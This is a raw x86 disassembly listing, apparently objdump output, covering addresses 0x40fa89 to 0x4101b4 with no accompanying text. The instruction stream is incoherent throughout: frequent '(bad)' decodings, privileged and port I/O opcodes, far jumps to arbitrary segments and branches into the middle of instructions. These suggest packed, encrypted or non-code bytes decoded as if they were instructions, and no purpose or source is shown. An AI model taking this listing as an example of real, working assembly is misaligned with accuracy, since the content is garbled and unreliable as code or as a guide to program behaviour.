  40fa89:	add    eax,0x645fd50e
  40fa8e:	icebp  
  40fa8f:	jnp    0x40fb0d
  40fa91:	out    0xe2,al
  40fa93:	sysret 
  40fa95:	scas   al,BYTE PTR es:[edi]
  40fa96:	call   0xdeb9019d
  40fa9b:	test   al,0xd6
  40fa9d:	adc    DWORD PTR [ebx+0xabee25e],esi
  40faa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40faa4:	daa    
  40faa5:	pop    eax
  40faa6:	push   esp
  40faa7:	bound  ebx,QWORD PTR [ecx-0x53a19965]
  40faad:	inc    eax
  40faae:	dec    ecx
  40faaf:	pusha  
  40fab0:	mov    ch,0x5f
  40fab2:	and    DWORD PTR [edi+0x2dce86ff],0x64
  40fab9:	mov    ch,0xcd
  40fabb:	jns    0x40fa60
  40fabd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fabe:	addr16 jp 0x40fa96
  40fac1:	(bad)
  40fac6:	cmp    eax,0xec55a5b9
  40facb:	(bad)  
  40facc:	push   ebp
  40facd:	lahf   
  40face:	hlt    
  40facf:	loope  0x40faf2
  40fad1:	adc    ah,BYTE PTR [edi]
  40fad3:	adc    BYTE PTR [ecx+0x6e],al
  40fad6:	sub    edi,eax
  40fad8:	outs   dx,BYTE PTR ds:[esi]
  40fad9:	xor    edi,DWORD PTR [edi-0x12]
  40fadc:	enter  0x159b,0xfd
  40fae0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fae1:	repnz enter 0x87e1,0x43
  40fae6:	or     esi,eax
  40fae8:	lahf   
  40fae9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40faea:	cmp    BYTE PTR [edi],al
  40faec:	rol    ecx,0xe7
  40faef:	mov    esi,0x8983dcaa
  40faf4:	mov    DWORD PTR cs:[edi+0x3c5fc0d3],ebp
  40fafb:	xor    BYTE PTR [ebx],0x49
  40fafe:	add    DWORD PTR [edx+0x7],esi
  40fb01:	int3   
  40fb02:	jne    0x40fb46
  40fb04:	jbe    0x40fb39
  40fb06:	add    esp,DWORD PTR [ecx+0xca29067]
  40fb0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb0d:	dec    DWORD PTR [eax-0x33]
  40fb10:	dec    ebx
  40fb11:	sbb    ebx,DWORD PTR [ecx-0xb778bfc]
  40fb17:	pusha  
  40fb18:	dec    ebx
  40fb19:	sub    DWORD PTR [ebx],ebp
  40fb1b:	jge    0x40fb31
  40fb1d:	pop    ebp
  40fb1e:	nop
  40fb1f:	mov    es,WORD PTR [esi+esi*2]
  40fb22:	fisubr WORD PTR [eax-0x591b8112]
  40fb28:	mov    DWORD PTR [ecx-0xb],edx
  40fb2b:	inc    eax
  40fb2c:	stos   BYTE PTR es:[edi],al
  40fb2d:	mov    ebp,0xc1ae6505
  40fb32:	jno    0x40fab8
  40fb34:	push   ecx
  40fb35:	cwde   
  40fb36:	ss dec edi
  40fb38:	stc    
  40fb39:	psraw  mm6,mm7
  40fb3c:	(bad)  
  40fb3d:	push   0xffffffa3
  40fb3f:	nop
  40fb40:	add    dl,cl
  40fb42:	or     eax,0xb7c3b493
  40fb47:	fadd   DWORD PTR [edi+ebp*8+0xb]
  40fb4b:	fcmovnu st,st(7)
  40fb4d:	ins    DWORD PTR es:[edi],dx
  40fb4e:	push   ds
  40fb4f:	xchg   edx,eax
  40fb50:	in     eax,0x1
  40fb52:	pop    eax
  40fb53:	inc    eax
  40fb54:	cmp    BYTE PTR [eax+0x5cd1669b],bh
  40fb5a:	mov    BYTE PTR es:[edx],cl
  40fb5d:	sbb    DWORD PTR [ebp+eax*1-0x1d],0x8bf75f8e
  40fb65:	ja     0x40fb25
  40fb67:	scas   al,BYTE PTR es:[edi]
  40fb68:	mov    edi,DWORD PTR [esi+0x4b]
  40fb6b:	aaa    
  40fb6c:	retf   
  40fb6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb6e:	xor    al,0x72
  40fb70:	inc    edx
  40fb71:	test   BYTE PTR [ecx],0x30
  40fb74:	sbb    cl,BYTE PTR [edx-0x75]
  40fb77:	popa   
  40fb78:	std    
  40fb79:	rcl    BYTE PTR [edx+0x1],1
  40fb7c:	xor    BYTE PTR [ebx+0x4d0648ff],ch
  40fb82:	gs int 0xe
  40fb85:	not    edi
  40fb87:	push   esi
  40fb88:	ins    DWORD PTR es:[edi],dx
  40fb89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb8a:	xchg   edi,eax
  40fb8b:	mov    ebp,esi
  40fb8d:	leave  
  40fb8e:	ins    BYTE PTR es:[edi],dx
  40fb8f:	lahf   
  40fb90:	jle    0x40fb98
  40fb92:	pop    esp
  40fb93:	push   edi
  40fb94:	outs   dx,DWORD PTR ds:[esi]
  40fb95:	test   eax,0xca92c386
  40fb9a:	ss push es
  40fb9c:	add    al,0xc6
  40fb9e:	pushf  
  40fb9f:	outs   dx,DWORD PTR ds:[esi]
  40fba0:	mov    bh,0x76
  40fba2:	mov    BYTE PTR [ebx+0x5e461156],bl
  40fba8:	xor    edi,DWORD PTR [ebp+edx*1+0x48]
  40fbac:	gs ds es dec ax
  40fbb1:	aas    
  40fbb2:	lods   eax,DWORD PTR ds:[esi]
  40fbb3:	and    esp,DWORD PTR [ebx+0x59]
  40fbb6:	aas    
  40fbb7:	and    BYTE PTR ss:[ecx+edx*2+0x76e717be],bh
  40fbbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbc0:	mov    bl,0xff
  40fbc2:	icebp  
  40fbc3:	into   
  40fbc4:	pop    edx
  40fbc5:	les    ecx,FWORD PTR [ebx]
  40fbc7:	lock (bad) 
  40fbc9:	std    
  40fbca:	ins    DWORD PTR es:[edi],dx
  40fbcb:	in     eax,dx
  40fbcc:	or     al,0xd
  40fbce:	int    0x4c
  40fbd0:	out    0x17,eax
  40fbd2:	imul   ebx,DWORD PTR [ecx],0x75fb4c27
  40fbd8:	not    BYTE PTR ds:0xb5719c6
  40fbde:	inc    ebx
  40fbdf:	sub    eax,0x85304a3a
  40fbe4:	cmp    dh,al
  40fbe6:	lods   al,BYTE PTR ds:[esi]
  40fbe7:	sub    DWORD PTR [edi-0x38],ebp
  40fbea:	repnz lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbed:	push   ebx
  40fbee:	xor    al,0x4d
  40fbf0:	mov    edx,eax
  40fbf2:	sub    al,0x1e
  40fbf4:	or     esi,DWORD PTR [ebp+0x60]
  40fbf7:	add    bl,BYTE PTR [eax+0x68ab81af]
  40fbfd:	imul   esi,eax,0x2ef88715
  40fc03:	inc    esp
  40fc04:	xlat   BYTE PTR ds:[ebx]
  40fc05:	cmp    ah,BYTE PTR [edi]
  40fc07:	xchg   ecx,eax
  40fc08:	push   eax
  40fc09:	test   BYTE PTR [ebx-0x30],0x2f
  40fc0d:	inc    ebx
  40fc0e:	and    cl,bl
  40fc10:	mov    edi,0x2ffde5a0
  40fc15:	ins    DWORD PTR es:[edi],dx
  40fc16:	std    
  40fc17:	adc    cl,BYTE PTR [ebx]
  40fc19:	(bad)  
  40fc1b:	out    0xeb,eax
  40fc1d:	jnp    0x40fbdf
  40fc1f:	fist   DWORD PTR [ecx]
  40fc21:	push   esi
  40fc22:	in     al,0x73
  40fc24:	sti    
  40fc25:	mov    ds:0x1c70abf9,eax
  40fc2a:	mov    ds:0x2fe51a17,eax
  40fc2f:	inc    edx
  40fc30:	test   BYTE PTR [edi+eax*8+0x59],bl
  40fc34:	ins    BYTE PTR es:[edi],dx
  40fc35:	xchg   ecx,eax
  40fc36:	rcl    BYTE PTR [ebx+0x6b],0xf7
  40fc3a:	pop    ecx
  40fc3b:	add    DWORD PTR [ebp+0x722514d4],ebx
  40fc41:	mov    eax,0x457e5ae0
  40fc46:	sti    
  40fc47:	stos   BYTE PTR es:[edi],al
  40fc48:	cdq    
  40fc49:	jo     0x40fc78
  40fc4b:	mov    BYTE PTR [esi],0x7f
  40fc4e:	cmp    BYTE PTR [edi-0x6e4a7f6a],al
  40fc54:	mov    ds:0x13e2330f,eax
  40fc59:	pop    ds
  40fc5a:	lock mov ebx,0x904760ea
  40fc60:	jecxz  0x40fc1a
  40fc62:	push   ebp
  40fc63:	dec    esp
  40fc64:	push   ecx
  40fc65:	sub    eax,DWORD PTR [edx-0x459582f7]
  40fc6b:	int3   
  40fc6c:	push   eax
  40fc6d:	enter  0x8c83,0xbd
  40fc71:	jmp    DWORD PTR [edx+0x70905cb6]
  40fc77:	push   ds
  40fc78:	jge    0x40fc66
  40fc7a:	push   es
  40fc7b:	(bad)  
  40fc7c:	in     eax,0x7e
  40fc7e:	pop    eax
  40fc7f:	or     BYTE PTR [ecx-0x2b610ce3],0x31
  40fc86:	mov    ds:0x7a20711d,al
  40fc8b:	mov    bh,0xe
  40fc8d:	stos   BYTE PTR es:[edi],al
  40fc8e:	adc    al,0x1e
  40fc90:	sti    
  40fc91:	push   eax
  40fc92:	popf   
  40fc93:	retf   
  40fc94:	mov    DWORD PTR [esi+eiz*8],esi
  40fc97:	int3   
  40fc98:	fdiv   QWORD PTR [edi+ebp*4-0x67]
  40fc9c:	into   
  40fc9d:	dec    ebp
  40fc9e:	mov    ecx,0xcfec1161
  40fca3:	out    0xf1,al
  40fca5:	mov    ebx,0xb682c5c1
  40fcaa:	pop    eax
  40fcab:	mov    al,ds:0xa41f049b
  40fcb0:	pop    es
  40fcb1:	lahf   
  40fcb2:	and    al,0x4
  40fcb4:	dec    ecx
  40fcb5:	sub    DWORD PTR [ebx-0x53],esp
  40fcb8:	add    eax,0xd245b81b
  40fcbd:	shl    ch,1
  40fcbf:	fiadd  DWORD PTR [ecx]
  40fcc1:	mov    dh,0x1e
  40fcc3:	mov    ah,0x6a
  40fcc5:	scas   al,BYTE PTR es:[edi]
  40fcc6:	sbb    bh,ah
  40fcc8:	xor    BYTE PTR [esi+0x6e960fc],ch
  40fcce:	push   0x1
  40fcd0:	aas    
  40fcd1:	push   eax
  40fcd2:	xchg   esp,eax
  40fcd3:	ret    0xf800
  40fcd6:	pop    esp
  40fcd7:	ins    DWORD PTR es:[edi],dx
  40fcd8:	or     DWORD PTR [edi-0x7],ebp
  40fcdb:	sub    BYTE PTR [edi-0x4e],dl
  40fcde:	sti    
  40fcdf:	outs   dx,DWORD PTR ds:[esi]
  40fce0:	pop    esi
  40fce1:	inc    edi
  40fce2:	stc    
  40fce3:	in     al,dx
  40fce4:	jbe    0x40fd53
  40fce6:	or     ah,dl
  40fce8:	xchg   esi,eax
  40fce9:	or     al,0xcc
  40fceb:	in     eax,0x4f
  40fced:	mov    BYTE PTR [eax+0x3350a2cb],bl
  40fcf3:	or     bl,BYTE PTR [ecx]
  40fcf5:	xchg   ah,dh
  40fcf7:	leave  
  40fcf8:	xchg   BYTE PTR [esi-0x71033fde],cl
  40fcfe:	or     al,0xe4
  40fd00:	xchg   esp,eax
  40fd01:	and    eax,eax
  40fd03:	jg     0x40fd3e
  40fd05:	pop    esp
  40fd06:	mov    eax,ds:0xa41c61a2
  40fd0b:	jne    0x40fd28
  40fd0d:	sub    al,0xf2
  40fd0f:	sbb    esp,DWORD PTR [eax]
  40fd11:	xchg   ebp,eax
  40fd12:	nop
  40fd13:	xchg   bl,ch
  40fd15:	or     esp,DWORD PTR [esi-0x68c3eec0]
  40fd1b:	jnp    0x40fcd1
  40fd1d:	test   eax,0xe470facf
  40fd22:	pop    eax
  40fd23:	out    dx,al
  40fd24:	outs   dx,BYTE PTR ds:[esi]
  40fd25:	ror    DWORD PTR [eax-0x2a89d475],cl
  40fd2b:	neg    BYTE PTR [ebx-0x61]
  40fd2e:	ret    0xc9f4
  40fd31:	pop    ss
  40fd32:	aaa    
  40fd33:	test   al,0x89
  40fd35:	and    esi,DWORD PTR [eax-0x27660ef9]
  40fd3b:	fiadd  DWORD PTR [edi-0x2b15cee4]
  40fd41:	mov    esp,0xc3d1517c
  40fd46:	je     0x40fdc7
  40fd48:	mov    eax,ds:0x822aa466
  40fd4d:	mov    eax,ds:0xc42d5b26
  40fd52:	pop    es
  40fd53:	or     BYTE PTR [ecx-0x4],0x81
  40fd57:	add    DWORD PTR [ecx-0x2af505a5],0x4cd1ed75
  40fd61:	mov    esi,0xa9c45640
  40fd66:	sbb    eax,0xaf62c016
  40fd6b:	jp     0x40fd3b
  40fd6d:	sub    ebx,DWORD PTR [eax+0x4d]
  40fd70:	leave  
  40fd71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd72:	cld    
  40fd73:	les    ebx,FWORD PTR [edi]
  40fd75:	(bad)  
  40fd76:	jae    0x40fdcc
  40fd78:	imul   edx,ecx,0x83921f9d
  40fd7e:	or     eax,0x887c370e
  40fd83:	mov    ecx,0x2da9a25c
  40fd88:	pop    edx
  40fd89:	aam    0xc5
  40fd8b:	adc    edx,DWORD PTR [esi]
  40fd8d:	cs repnz mov ch,0xf4
  40fd91:	cmp    BYTE PTR [ebp+0x20350dcc],ah
  40fd97:	push   es
  40fd98:	outs   dx,DWORD PTR ds:[esi]
  40fd99:	cdq    
  40fd9a:	and    DWORD PTR [edx+0x20],ebx
  40fd9d:	mov    esp,0x3761e1b1
  40fda2:	mov    ebx,0xb89e55df
  40fda7:	retf   
  40fda8:	pop    ebp
  40fda9:	(bad)  
  40fdaa:	(bad)  
  40fdab:	rcl    cl,cl
  40fdad:	lahf   
  40fdae:	stos   DWORD PTR es:[edi],eax
  40fdaf:	mov    edx,0x54c80cd4
  40fdb4:	sbb    al,0x2c
  40fdb6:	in     al,0x81
  40fdb8:	pop    esp
  40fdb9:	sbb    DWORD PTR [edx+edi*1+0x4efeb808],edx
  40fdc0:	cmc    
  40fdc1:	bnd jp 0x40fe03
  40fdc4:	mov    ecx,0xd5059970
  40fdc9:	es sbb dl,bh
  40fdcc:	add    eax,0x8d4464f6
  40fdd1:	xlat   BYTE PTR ds:[ebx]
  40fdd2:	lods   al,BYTE PTR gs:[esi]
  40fdd4:	mov    eax,ds:0x42901d6b
  40fdd9:	pop    edi
  40fdda:	sbb    eax,0x1d255a96
  40fddf:	int    0xde
  40fde1:	sub    bh,BYTE PTR [eax-0x31]
  40fde4:	dec    ebx
  40fde5:	in     al,dx
  40fde6:	push   0xffffffa1
  40fde8:	jnp    0x40fe54
  40fdea:	sbb    bl,BYTE PTR [eax+0x6d]
  40fded:	scas   al,BYTE PTR es:[edi]
  40fdee:	inc    edi
  40fdef:	lahf   
  40fdf0:	scas   al,BYTE PTR es:[edi]
  40fdf1:	fcom   QWORD PTR [edx+0x657516c9]
  40fdf7:	mov    al,0x42
  40fdf9:	dec    esp
  40fdfa:	aad    0xfb
  40fdfc:	mov    eax,0x6ea2ff03
  40fe01:	xchg   ebp,eax
  40fe02:	out    0x3c,eax
  40fe04:	pusha  
  40fe05:	add    DWORD PTR [ebp-0x32],edi
  40fe08:	cwde   
  40fe09:	arpl   WORD PTR [ecx-0x57],bx
  40fe0c:	lds    esp,FWORD PTR [ecx]
  40fe0e:	popf   
  40fe0f:	or     edx,DWORD PTR [ecx+0x75]
  40fe12:	jmp    0x6e16:0xa4d606ea
  40fe19:	in     eax,0x75
  40fe1b:	in     al,0xbb
  40fe1d:	jns    0x40fde1
  40fe1f:	ret    
  40fe20:	dec    eax
  40fe21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe22:	and    eax,0x376e0562
  40fe27:	or     esp,DWORD PTR [esi+0x3e92e772]
  40fe2d:	cld    
  40fe2e:	pop    ebx
  40fe2f:	mov    cl,0x1
  40fe31:	push   esp
  40fe32:	dec    ebp
  40fe33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe34:	mov    ds:0x9cb9f514,al
  40fe39:	or     edx,esp
  40fe3b:	add    eax,0xb10ff005
  40fe40:	stos   DWORD PTR es:[edi],eax
  40fe41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe42:	popa   
  40fe43:	cmp    eax,0xab83f19
  40fe48:	(bad)  
  40fe49:	loope  0x40fe66
  40fe4b:	xchg   ebp,eax
  40fe4c:	fst    st(2)
  40fe4e:	(bad)  [ebx+0x3d]
  40fe51:	add    cl,BYTE PTR [ebp-0x4c]
  40fe54:	sub    eax,0xaf5f163d
  40fe59:	xchg   ebp,eax
  40fe5a:	clc    
  40fe5b:	ss iret 
  40fe5d:	aad    0xff
  40fe5f:	imul   esp,DWORD PTR [ebx-0x15],0xffffffb9
  40fe63:	out    0x13,eax
  40fe65:	push   es
  40fe66:	cmc    
  40fe67:	fs pop esp
  40fe69:	out    dx,eax
  40fe6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe6b:	cmp    BYTE PTR [ebx+0x75b1bf94],0x15
  40fe72:	mov    bl,0x38
  40fe74:	cmp    BYTE PTR [ebp+0x55],al
  40fe77:	dec    ecx
  40fe78:	fsubr  st(4),st
  40fe7a:	adc    al,0x6
  40fe7c:	jle    0x40fed8
  40fe7e:	hlt    
  40fe7f:	sbb    BYTE PTR [esi+edi*8+0x7b17c27b],bl
  40fe86:	imul   esi,DWORD PTR ds:0x9c208b68,0xffffffc4
  40fe8d:	sti    
  40fe8e:	repz xchg ecx,eax
  40fe90:	imul   ebx,DWORD PTR [ebx+0x672d7be2],0xffffffd3
  40fe97:	mov    esi,0x574f01e6
  40fe9c:	cli    
  40fe9d:	mov    cl,0xd7
  40fe9f:	pcmpgtw mm4,QWORD PTR [eax+0x48]
  40fea3:	sahf   
  40fea4:	in     eax,dx
  40fea5:	sub    BYTE PTR [ebp+eax*4+0x79],bl
  40fea9:	xchg   ebp,ebp
  40feab:	xchg   edx,eax
  40feac:	fcomp  QWORD PTR [ebx]
  40feae:	inc    edi
  40feaf:	imul   edx,esi,0xcafb1e33
  40feb5:	xchg   DWORD PTR [edi+ebp*8],eax
  40feb8:	outs   dx,DWORD PTR ds:[esi]
  40feb9:	pop    esp
  40feba:	loope  0x40ff24
  40febc:	jno    0x40fe4a
  40febe:	xor    eax,0xd871af46
  40fec3:	jno    0x40fe99
  40fec5:	push   edx
  40fec6:	mov    eax,DWORD PTR [ebx]
  40fec8:	jnp    0x40ff10
  40feca:	mov    dl,0x7c
  40fecc:	sbb    al,0x41
  40fece:	aas    
  40fecf:	mov    WORD PTR [ebp-0x74],fs
  40fed2:	pop    ds
  40fed3:	sbb    al,0x56
  40fed5:	fs xchg edx,eax
  40fed7:	add    DWORD PTR [ebx],edx
  40fed9:	jmp    0x40ff39
  40fedb:	pop    es
  40fedc:	xor    eax,0x86fddcdd
  40fee1:	adc    edi,edx
  40fee3:	xor    al,0xc3
  40fee5:	push   eax
  40fee6:	dec    bh
  40fee8:	adc    BYTE PTR [edi],ah
  40feea:	inc    ebx
  40feeb:	cdq    
  40feec:	icebp  
  40feed:	xchg   edx,eax
  40feee:	inc    eax
  40feef:	sub    eax,0xd89d1a38
  40fef4:	mov    bh,0x88
  40fef6:	aas    
  40fef7:	or     ebx,DWORD PTR [edi-0x47]
  40fefa:	repz fdivrp st(6),st
  40fefd:	sbb    eax,0x2b9346cf
  40ff02:	loope  0x40ff34
  40ff04:	dec    eax
  40ff05:	dec    ecx
  40ff06:	addr16 out 0xa8,al
  40ff09:	inc    ecx
  40ff0a:	push   es
  40ff0b:	cmp    cl,BYTE PTR [eax]
  40ff0d:	ins    BYTE PTR es:[edi],dx
  40ff0e:	pop    edx
  40ff0f:	cmp    al,0x4c
  40ff11:	and    DWORD PTR [eax+0x59],edx
  40ff14:	and    BYTE PTR [ebp+esi*1+0x4e2e8666],ah
  40ff1b:	xor    DWORD PTR [eax],esi
  40ff1d:	mov    ebx,0xe8d8db59
  40ff22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff23:	ins    DWORD PTR es:[edi],dx
  40ff24:	cs push cs
  40ff26:	shl    DWORD PTR [esi+eax*1+0x15f9df],cl
  40ff2d:	adc    BYTE PTR [ebx-0x21],dl
  40ff30:	push   esi
  40ff31:	cmc    
  40ff32:	mov    al,ds:0x2a113c27
  40ff37:	xor    DWORD PTR [ecx+eiz*2+0x5e],0x38
  40ff3c:	nop
  40ff3d:	mov    bl,0x3b
  40ff3f:	call   0x146d:0x7b55d1e7
  40ff46:	das    
  40ff47:	cmp    al,0x41
  40ff49:	jmp    0x40ffab
  40ff4b:	xchg   edx,eax
  40ff4c:	sahf   
  40ff4d:	pushf  
  40ff4e:	push   0xc
  40ff50:	sub    ah,BYTE PTR [esi]
  40ff52:	lds    edi,FWORD PTR [esi+ecx*1]
  40ff55:	dec    ecx
  40ff56:	cwde   
  40ff57:	aad    0xe2
  40ff59:	adc    DWORD PTR [ebx],eax
  40ff5b:	mov    al,ds:0xe1ba9fa6
  40ff60:	xchg   ebp,eax
  40ff61:	jmp    0xf041:0x9070f340
  40ff68:	cmc    
  40ff69:	push   cs
  40ff6a:	push   ebp
  40ff6b:	dec    esi
  40ff6c:	mov    ebp,0x101f0837
  40ff71:	shr    BYTE PTR [esi],0x1e
  40ff74:	lahf   
  40ff75:	addr16 xchg ebx,eax
  40ff77:	jmp    0x78816b27
  40ff7c:	sbb    ah,bl
  40ff7e:	mov    ah,0x38
  40ff80:	xor    BYTE PTR [eax-0x75999432],dl
  40ff86:	cmp    ch,ah
  40ff88:	les    edi,FWORD PTR [esi+0xdcde230]
  40ff8e:	mov    eax,0x3a9785df
  40ff93:	test   al,0xe
  40ff95:	sahf   
  40ff96:	push   ecx
  40ff97:	cmc    
  40ff98:	shl    BYTE PTR [esi+ebp*2],cl
  40ff9b:	icebp  
  40ff9c:	xor    dh,al
  40ff9e:	inc    eax
  40ff9f:	push   edx
  40ffa0:	and    DWORD PTR [edx],eax
  40ffa2:	mov    ecx,0x96d25a25
  40ffa7:	or     ecx,DWORD PTR [esi-0x42cccd47]
  40ffad:	mov    ecx,0x698ad9cd
  40ffb2:	cmp    bl,BYTE PTR [edx+0x1a]
  40ffb5:	ja     0x40ff7c
  40ffb7:	jg     0x41000c
  40ffb9:	rcr    DWORD PTR [edi+0x5c],1
  40ffbc:	outs   dx,DWORD PTR ds:[esi]
  40ffbd:	pop    esp
  40ffbe:	cli    
  40ffbf:	sub    dl,BYTE PTR [ebx]
  40ffc1:	rol    DWORD PTR [edi-0x580d123e],0xb9
  40ffc8:	mov    esi,0x648d63ee
  40ffcd:	sbb    esi,DWORD PTR [ebx-0x23ca13dd]
  40ffd3:	cli    
  40ffd4:	mov    ds:0x36cdcf76,al
  40ffd9:	fsubr  QWORD PTR [ebx]
  40ffdb:	mov    cl,al
  40ffdd:	sahf   
  40ffde:	repz test eax,0x8251862a
  40ffe4:	test   BYTE PTR [esi],bl
  40ffe6:	imul   esi,esi,0xffffffee
  40ffe9:	adc    al,0x7b
  40ffeb:	outs   dx,BYTE PTR ds:[esi]
  40ffec:	mov    esp,0x75f496a8
  40fff1:	bound  ebx,QWORD PTR [edx]
  40fff3:	mov    bh,0x22
  40fff5:	mov    ecx,0xba7c17ec
  40fffa:	add    eax,0x2ae3ed7c
  40ffff:	mov    bh,0x12
  410001:	repnz xor BYTE PTR [edi],bh
  410004:	mov    esp,eax
  410006:	imul   ebp,esp,0xffffffa8
  410009:	fs pop es
  41000b:	jl     0x40ffb7
  41000d:	ins    DWORD PTR es:[edi],dx
  41000e:	mov    ecx,0xb47e57b4
  410013:	sbb    bh,bl
  410015:	pop    esp
  410016:	pushf  
  410017:	div    BYTE PTR ds:0x24f4f7b3
  41001d:	dec    esi
  41001e:	mov    cl,0x8e
  410020:	scas   al,BYTE PTR es:[edi]
  410021:	lahf   
  410022:	movntps XMMWORD PTR [ecx+0x47],xmm2
  410026:	mov    ds:0x9e6b222a,eax
  41002b:	push   ss
  41002c:	mov    BYTE PTR [eax+0x23],dh
  41002f:	fbld   TBYTE PTR [edx+0x7c6742e6]
  410035:	popf   
  410036:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410037:	push   ebx
  410038:	icebp  
  410039:	cmp    DWORD PTR [ecx],esp
  41003b:	lods   al,BYTE PTR ds:[esi]
  41003c:	jg     0x4100b8
  41003e:	in     al,dx
  41003f:	outs   dx,BYTE PTR ds:[esi]
  410040:	out    0x8a,eax
  410042:	add    eax,0xf8756c7a
  410047:	iret   
  410048:	mov    eax,0x90a36b3d
  41004d:	add    edi,DWORD PTR [ecx-0x15]
  410050:	cmc    
  410051:	jo     0x4100cb
  410053:	dec    ebp
  410054:	xchg   edi,eax
  410055:	call   0xc04f490
  41005a:	xor    ebx,DWORD PTR [edi]
  41005c:	xchg   ecx,eax
  41005d:	(bad)  
  41005e:	jecxz  0x41008a
  410060:	add    BYTE PTR [esi-0x27],bl
  410063:	sbb    ch,BYTE PTR [edi]
  410065:	adc    esp,DWORD PTR [ecx-0x7]
  410068:	xor    DWORD PTR [edx+0x285313da],edx
  41006e:	push   edx
  41006f:	mov    al,0x2f
  410071:	mov    DWORD PTR [eax-0x7be6786d],ebx
  410077:	fwait
  410078:	push   cs
  410079:	gs sbb dl,dh
  41007c:	scas   al,BYTE PTR es:[edi]
  41007d:	in     eax,0x77
  41007f:	push   eax
  410080:	cmc    
  410081:	call   0x4fb2:0xcdd657a
  410088:	loope  0x4100a8
  41008a:	adc    ecx,edi
  41008c:	(bad)  
  41008e:	lea    edi,[eax]
  410090:	repnz xchg dl,ah
  410093:	xor    al,0x2
  410095:	xchg   esi,eax
  410096:	mul    DWORD PTR [ebp+0x10680dc9]
  41009c:	adc    ah,BYTE PTR [ebp-0x3a2292aa]
  4100a2:	push   ecx
  4100a3:	shl    BYTE PTR [esi+0x4d],cl
  4100a6:	call   0xd521a1a3
  4100ab:	jecxz  0x4100bf
  4100ad:	add    ebp,edi
  4100af:	ss dec edx
  4100b1:	push   es
  4100b2:	imul   ebx,ebx,0x8a37ec45
  4100b8:	clc    
  4100b9:	jl     0x410047
  4100bb:	pop    ss
  4100bc:	add    al,0x1d
  4100be:	pop    ebx
  4100bf:	fwait
  4100c0:	xchg   ebx,eax
  4100c1:	mov    ds:0x9224b3fe,eax
  4100c6:	pop    ax
  4100c8:	bound  ebx,QWORD PTR [esi-0x1e]
  4100cb:	inc    esp
  4100cc:	stos   BYTE PTR es:[edi],al
  4100cd:	or     ecx,DWORD PTR [edi]
  4100cf:	sub    eax,DWORD PTR [ebx-0x5]
  4100d2:	sbb    ebx,esi
  4100d4:	je     0x41012f
  4100d6:	push   eax
  4100d7:	jecxz  0x4100c3
  4100d9:	sub    bl,BYTE PTR [eax+0x571acdee]
  4100df:	nop
  4100e0:	adc    ah,dh
  4100e2:	std    
  4100e3:	mov    eax,0x25b0120d
  4100e8:	sub    BYTE PTR ds:0x93bfa206,al
  4100ee:	fidiv  WORD PTR [ecx+esi*1-0x6ddf8306]
  4100f5:	xlat   BYTE PTR ds:[ebx]
  4100f7:	test   al,0x51
  4100f9:	cmp    al,0x87
  4100fb:	adc    BYTE PTR ss:[esi],0x80
  4100ff:	lock and ah,BYTE PTR ds:0xb261184
  410106:	push   edi
  410107:	pop    ds
  410108:	jns    0x4100c2
  41010a:	push   ds
  41010b:	test   eax,0xd99c2b03
  410110:	ror    DWORD PTR [eax+0x51],0xe5
  410114:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410115:	add    BYTE PTR [edi],al
  410117:	shr    BYTE PTR [ecx],cl
  410119:	mov    dl,0x67
  41011b:	xchg   ecx,eax
  41011d:	jl     0x41016d
  41011f:	clc    
  410120:	in     al,dx
  410121:	cmp    DWORD PTR [edi-0x3c685c2b],esi
  410127:	add    al,0xbf
  410129:	imul   DWORD PTR [edi+0x515adf56]
  41012f:	or     esi,DWORD PTR [eax-0x23]
  410132:	or     BYTE PTR [edi],cl
  410134:	and    esp,ecx
  410136:	push   ss
  410137:	push   ds
  410138:	or     esp,DWORD PTR [edx]
  41013a:	dec    ecx
  41013b:	or     eax,0xd614f697
  410140:	mov    bh,bh
  410142:	es dec ebp
  410144:	push   es
  410145:	dec    eax
  410146:	aaa    
  410147:	cli    
  410148:	jo     0x4100f5
  41014a:	repnz adc eax,DWORD PTR [edi-0x19]
  41014e:	leave  
  41014f:	cmc    
  410150:	adc    esp,DWORD PTR [ebx-0x13]
  410153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410154:	push   ebx
  410155:	pop    ebp
  410156:	sbb    BYTE PTR [eax],dh
  410158:	ret    
  410159:	jmp    0xbe2d209a
  41015e:	mov    cl,0xde
  410160:	jmp    0x410102
  410162:	sub    eax,0x5dc28b8a
  410167:	xchg   edi,eax
  410168:	cmp    eax,edx
  41016a:	sub    BYTE PTR ds:0xdf0b96ff,0x47
  410171:	int3   
  410172:	add    ebx,DWORD PTR [edi-0x33]
  410175:	jmp    0x3cfc:0xdbc91d46
  41017c:	psubusw mm6,QWORD PTR [ebx-0x19]
  410180:	sub    eax,esi
  410182:	ror    BYTE PTR [edx-0x48bcd61b],0x4f
  410189:	sbb    DWORD PTR [esi],esp
  41018b:	push   ss
  41018c:	adc    al,bl
  41018e:	retf   0xcb3e
  410191:	daa    
  410192:	daa    
  410193:	jae    0x4101b5
  410195:	xchg   cl,ch
  410197:	out    0xac,eax
  410199:	mov    esp,esi
  41019b:	or     al,0x50
  41019d:	ins    BYTE PTR es:[edi],dx
  41019e:	push   ds
  41019f:	shl    esp,1
  4101a1:	mov    ebx,0x3cc1b157
  4101a6:	(bad)  
  4101a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101a8:	nop
  4101a9:	cdq    
  4101aa:	(bad)  
  4101ab:	out    0x70,al
  4101ad:	mov    esp,0x4635c05f
  4101b2:	dec    ebp
  4101b3:	cld    
  4101b4:	sti    
